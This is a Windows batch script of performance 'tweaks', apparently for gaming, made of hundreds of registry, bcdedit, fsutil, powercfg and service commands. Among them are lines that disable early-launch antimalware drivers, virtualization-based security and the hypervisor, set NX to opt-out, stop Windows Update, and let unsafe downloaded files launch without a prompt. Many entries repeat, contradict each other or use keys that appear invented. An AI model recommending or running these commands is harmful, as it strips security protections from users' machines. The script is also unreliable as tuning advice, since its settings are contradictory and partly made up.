Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\User\PowerSchemes\5e5da0cf-4a66-43a8-834e-b807e29f7358"" /v ""TimerMinResolution"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\User\PowerSchemes\5e5da0cf-4a66-43a8-834e-b807e29f7358"" /v ""TimerReliability"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\238C9FA8-0AAD-41ED-83F4-97BE242C8F20\7bc4a2f9-d8fc-4469-b07b-33eb785aaca0"" /v ""DynamicTick"" /t REG_DWORD /d ""0"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\238C9FA8-0AAD-41ED-83F4-97BE242C8F20\7bc4a2f9-d8fc-4469-b07b-33eb785aaca0"" /v ""EnergyDriverPolicy"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\238C9FA8-0AAD-41ED-83F4-97BE242C8F20\7bc4a2f9-d8fc-4469-b07b-33eb785aaca0"" /v ""EnergyDriverPolicyVideo"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\238C9FA8-0AAD-41ED-83F4-97BE242C8F20\7bc4a2f9-d8fc-4469-b07b-33eb785aaca0"" /v ""TimerBResolution"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\238C9FA8-0AAD-41ED-83F4-97BE242C8F20\7bc4a2f9-d8fc-4469-b07b-33eb785aaca0"" /v ""TimerMinResolution"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\238C9FA8-0AAD-41ED-83F4-97BE242C8F20\7bc4a2f9-d8fc-4469-b07b-33eb785aaca0"" /v ""TimerReliability"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""DynamicTick"" /t REG_DWORD /d ""0"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""EnergyDriverPolicy"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""EnergyDriverPolicyVideo"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""TimerBResolution"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""TimerMinResolution"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power"" /v ""TimerReliability"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyDriver"" /v ""DynamicTick"" /t REG_DWORD /d ""0"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyDriver"" /v ""EnergyDriverPolicy"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyDriver"" /v ""EnergyDriverPolicyVideo"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyDriver"" /v ""TimerBResolution"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyDriver"" /v ""TimerMinResolution"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyDriver"" /v ""TimerReliability"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\0012ee47-9041-4b5d-9b77-535fba8b1442"" /v ""DynamicTick"" /t REG_DWORD /d ""0"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\0012ee47-9041-4b5d-9b77-535fba8b1442"" /v ""EnergyDriverPolicy"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\0012ee47-9041-4b5d-9b77-535fba8b1442"" /v ""EnergyDriverPolicyVideo"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\0012ee47-9041-4b5d-9b77-535fba8b1442"" /v ""TimerBResolution"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\0012ee47-9041-4b5d-9b77-535fba8b1442"" /v ""TimerMinResolution"" /t REG_DWORD /d ""1"" /f
Reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\0012ee47-9041-4b5d-9b77-535fba8b1442"" /v ""TimerReliability"" /t REG_DWORD /d ""1"" /f
reg add ""HKEY_CURRENT_USER\Control Panel\Accessibility\Keyboard Response"" /v ""AutoRepeatDelay"" /t REG_SZ /d ""1000"" /f
reg add ""HKEY_CURRENT_USER\Control Panel\Accessibility\Keyboard Response"" /v ""AutoRepeatRate"" /t REG_SZ /d ""500"" /f
reg add ""HKEY_CURRENT_USER\Control Panel\Accessibility\Keyboard Response"" /v ""BounceTime"" /t REG_SZ /d ""0"" /f
reg add ""HKEY_CURRENT_USER\Control Panel\Accessibility\Keyboard Response"" /v ""DelayBeforeAcceptance"" /t REG_SZ /d ""0"" /f
reg add ""HKEY_CURRENT_USER\Control Panel\Accessibility\Keyboard Response"" /v ""Flags"" /t REG_SZ /d ""122"" /f
reg add ""HKEY_CURRENT_USER\Control Panel\Accessibility\Keyboard Response"" /v ""Last BounceKey Setting"" /t REG_DWORD /d 0 /f
reg add ""HKEY_CURRENT_USER\Control Panel\Accessibility\Keyboard Response"" /v ""Last Valid Delay"" /t REG_DWORD /d 0 /f
reg add ""HKEY_CURRENT_USER\Control Panel\Accessibility\Keyboard Response"" /v ""Last Valid Repeat"" /t REG_DWORD /d 0 /f
reg add ""HKEY_CURRENT_USER\Control Panel\Accessibility\Keyboard Response"" /v ""Last Valid Wait"" /t REG_DWORD /d 1000 /f
cls
fsutil behavior set disabledeletenotify 0
fsutil behavior set disabledeletenotify refs 0
fsutil behavior set mftzone 2
fsutil behavior set disablelastaccess 1
fsutil behavior set encryptpagingfile 0
fsutil behavior set memoryusage 2
fsutil behavior set disable8dot3 1
fsutil behavior set disablecompression 0
fsutil behavior set disableencryption 0
cls
Reg.exe add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\TaggedEnergy"" /v ""DisableTaggedEnergyLogging"" /t Reg_DWORD /d ""1"" /f
Reg.exe add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\TaggedEnergy"" /v ""TelemetryMaxApplication"" /t Reg_DWORD /d ""0"" /f
Reg.exe add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\TaggedEnergy"" /v ""TelemetryMaxTagPerApplication"" /t Reg_DWORD /d ""0"" /f
Reg.exe add ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Language"" /v ""SettingsVersion"" /t REG_DWORD /d ""3"" /f 
Reg.exe add ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\SettingSync\Groups\Language"" /v ""Enabled"" /t REG_DWORD /d ""0"" /f 
Reg.exe add ""HKCU\SOFTWARE\Microsoft\TabletTip\1.7"" /v ""EnableAutocorrection"" /t REG_DWORD /d ""0"" /f 
Reg.exe add ""HKCU\SOFTWARE\Microsoft\TabletTip\1.7"" /v ""EnableSpellchecking"" /t REG_DWORD /d ""0"" /f 
Reg.exe add ""HKCU\SOFTWARE\Microsoft\TabletTip\1.7"" /v ""EnableTextPrediction"" /t REG_DWORD /d ""0"" /f 
Reg.exe add ""HKCU\SOFTWARE\Microsoft\TabletTip\1.7"" /v ""EnablePredictionSpaceInsertion"" /t REG_DWORD /d ""0"" /f 
Reg.exe add ""HKCU\SOFTWARE\Microsoft\TabletTip\1.7"" /v ""EnableDoubleTapSpace"" /t REG_DWORD /d ""0"" /f 
Reg.exe add ""HKCU\SOFTWARE\Microsoft\TabletTip\1.7"" /v ""EnableInkingWithTouch"" /t REG_DWORD /d ""0"" /f 
Reg.exe add ""HKCU\SOFTWARE\Microsoft\Input\Settings"" /v ""InsightsEnabled"" /t REG_DWORD /d ""0"" /f 
Reg.exe add ""HKCU\SOFTWARE\Microsoft\Input\Settings"" /v ""Insights"" /t REG_BINARY /d ""01000000071de8c131cc8360a3d6d9c1330a686b165aba2e235f5a5c"" /f 
Reg.exe add ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\PenWorkspace"" /v ""PenWorkspaceAppSuggestionsEnabled"" /t REG_DWORD /d ""0"" /f 
Reg.exe add ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AutoplayHandlers"" /v ""DisableAutoplay"" /t REG_DWORD /d ""1"" /f 
Reg.exe add ""HKCU\SOFTWARE\Microsoft\InputPersonalization"" /v ""RestrictImplicitInkCollection"" /t REG_DWORD /d ""1"" /f 
Reg.exe add ""HKCU\SOFTWARE\Microsoft\InputPersonalization"" /v ""RestrictImplicitTextCollection"" /t REG_DWORD /d ""1"" /f 
Reg.exe add ""HKCU\System\GameConfigStore"" /v ""GameDVR_Enabled"" /t REG_DWORD /d ""0"" /f 
Reg.exe add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\GameDVR"" /v ""AllowGameDVR"" /t REG_DWORD /d ""0"" /f 
Reg.exe add ""HKCU\SOFTWARE\Microsoft\GameBar"" /v ""UseNexusForGameBarEnabled"" /t REG_DWORD /d ""0"" /f 
Reg.exe add ""HKCU\SOFTWARE\Microsoft\GameBar"" /v ""ShowStartupPanel"" /t REG_DWORD /d ""0"" /f
cls
bcdedit /set nolowmem Yes
bcdedit /set avoidlowmemory 0x8000000
bcdedit /set allowedinmemorysettings 0x0
bcdedit /set isolatedcontext No
bcdedit /set vsmlaunchtype Off
bcdedit /set MSI Default
bcdedit /set usephysicaldestination No
bcdedit /set noumex Yes
bcdedit /set pae ForceEnable
bcdedit /set extendedinput Yes
bcdedit /set usefirmwarepcisettings No
bcdedit /set disabledynamictick Yes
bcdedit /set useplatformclock No
bcdedit /set tscsyncpolicy Enhanced
bcdedit /set firstmegabytepolicy UseAll
bcdedit /set configaccesspolicy Default
bcdedit /set x2apicpolicy Enable
bcdedit /set ems No
bcdedit /set vm No
bcdedit /set highestmode Yes
bcdedit /set nx optout
bcdedit /set debug No
bcdedit /set forcefipscrypto No
bcdedit /set disableelamdrivers Yes
bcdedit /set bootmenupolicy Legacy
bcdedit /set quietboot Yes
bcdedit /set hypervisorlaunchtype Off
bcdedit /set uselegacyapicmode No
bcdedit /timeout 3
bcdedit /set IncreaseUserVA 0
bcdedit /set useplatformtick Yes
cls
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters"" /v EnablePrefetcher /t REG_DWORD /d 0 /f
reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Explorer"" /v ""DisableTaskbarWidgets"" /t REG_DWORD /d 1 /f
cls
powershell -Command ""Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize' -Name 'EnableTransparency' -Value 0""
RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters
ipconfig /flushdns
netsh int tcp set global autotuninglevel=disabled
reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3" /V "1806" /T "reg_DWORD" /D "00000000" /F
reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3" /V "1806" /T "reg_DWORD" /D "00000000" /F
cls
powershell -command "Clear-Content -Path $env:TEMP\* -Force; [System.GC]::Collect();"
cls
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d 26 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingExecutive" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "LargeSystemCache" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "ClearPageFileAtShutdown" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\7516b95f-f776-4464-8c53-06167f40cc99\7bc4a2f9-d8fc-4469-b07b-33eb785aaca0" /v "Attributes" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "SecondLevelDataCache" /t REG_DWORD /d 512 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "NonPagedPoolQuota" /t REG_DWORD /d 512 /f
cls
net stop "SysMain" >nul 2>&1
net stop "Connected User Experiences and Telemetry" >nul 2>&1
net stop "Diagnostic Policy Service" >nul 2>&1
net stop "Windows Update" >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d 26 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "DisablePagingExecutive" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "LargeSystemCache" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "ClearPageFileAtShutdown" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\7516b95f-f776-4464-8c53-06167f40cc99\7bc4a2f9-d8fc-4469-b07b-33eb785aaca0" /v "Attributes" /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "SecondLevelDataCache" /t REG_DWORD /d 512 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "NonPagedPoolQuota" /t REG_DWORD /d 512 /f
cls
PowerShell Disable-NetAdapterLso -Name "*"
powershell "ForEach($adapter In Get-NetAdapter){Disable-NetAdapterPowerManagement -Name $adapter.Name -ErrorAction SilentlyContinue}"
powershell "ForEach($adapter In Get-NetAdapter){Disable-NetAdapterLso -Name $adapter.Name -ErrorAction SilentlyContinue}"
cls
POWERSHELL Disable-NetAdapterPowerManagement -Name "*" -ErrorAction SilentlyContinue
bcdedit /set isolatedcontext No
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DistributeTimers" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableTsx" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "EnergyEstimationEnabled" /t REG_DWORD /d "0" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "EventProcessorEnabled" /t REG_DWORD /d "0" /f
cls
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DistributeTimers" /t REG_DWORD /d "1" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableTsx" /t REG_DWORD /d "1" /f

for %%i in (WakeEnabled WdkSelectiveSuspendEnable) do (
	for /f "delims=" %%a in ('reg query "HKLM\SYSTEM\CurrentControlSet\Control\Class" /s /f "%%~i" ^| findstr "HKEY"') do (
		reg add "%%a" /v "%%~i" /t REG_DWORD /d "0" /f
	)
)
powercfg -setacvalueindex 95533644-e700-4a79-a56c-a89e8cb109d9 238c9fa8-0aad-41ed-83f4-97be242c8f20 25dfa149-5dd1-4736-b5ab-e8a37b5b8187 0
Powercfg -setactive scheme_current
timeout /t 1 /nobreak > NUL
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\943c8cb6-6f93-4227-ad87-e9a3feec08d1" /v "Attributes" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "DCSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\3b04d4fd-1cc7-4f23-ab1c-d1337819c4bb\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\3b04d4fd-1cc7-4f23-ab1c-d1337819c4bb\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "DCSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\3b04d4fd-1cc7-4f23-ab1c-d1337819c4bb\DefaultPowerSchemeValues\8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Processor" /v "AllowPepPerfStates" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Processor" /v "Cstates" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Processor" /v "Capabilities" /t REG_DWORD /d "516198" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HighPerformance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HighestPerformance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MinimumThrottlePercent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumThrottlePercent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumPerformancePercent" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "Class1InitialUnparkCount" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "InitialUnparkCount" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumPerformancePercent" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "PerfEnergyPreference" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "PerfEnergyPreference" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPMinCores" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPMaxCores" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPMinCores1" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPMaxCores1" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CpLatencyHintUnpark1" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPDistribution" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CpLatencyHintUnpark" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "MaxPerformance1" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "MaxPerformance" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPDistribution1" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPHEADROOM" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\PowerCfg\GlobalPowerPolicy" /v "Policies" /t REG_BINARY /d "01000000020000000100000000000000020000000000000000000000000000002c0100003232030304000000040000000000000000000000840300002c01000000000000840300000001646464640000" /f
Reg.exe add "HKCU\Control Panel\PowerCfg\GlobalPowerPolicy" /v "Policies" /t REG_BINARY /d "01000000020000000100000000000000020000000000000000000000000000002c0100003232030304000000040000000000000000000000840300002c01000000000000840300000001646464640000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Processor" /v "Cstates" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Processor" /v "Capabilities" /t REG_DWORD /d "516198" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HighPerformance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HighestPerformance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MinimumThrottlePercent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumThrottlePercent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumPerformancePercent" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "Class1InitialUnparkCount" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "InitialUnparkCount" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumPerformancePercent" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPHEADROOM" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPCONCURRENCY" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "ProccesorThrottlingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleThreshold" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdle" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuLatencyTimer" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuSlowdown" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "DedicatedSegmentSize" /t REG_DWORD /d "1298" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "Threshold" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuDebuggingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "ProccesorLatencyThrottlingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueUser" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubPower" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDisabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubPower" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueCustom" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueAuto" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueManual" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueAutomatic" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDisabledByDefault" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueEnabledByDefault" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubValueDefaultAuto" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\943c8cb6-6f93-4227-ad87-e9a3feec08d1" /v "Attributes" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "DCSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\3b04d4fd-1cc7-4f23-ab1c-d1337819c4bb\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\3b04d4fd-1cc7-4f23-ab1c-d1337819c4bb\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "DCSettingIndex" /t REG_DWORD /d "0" /f
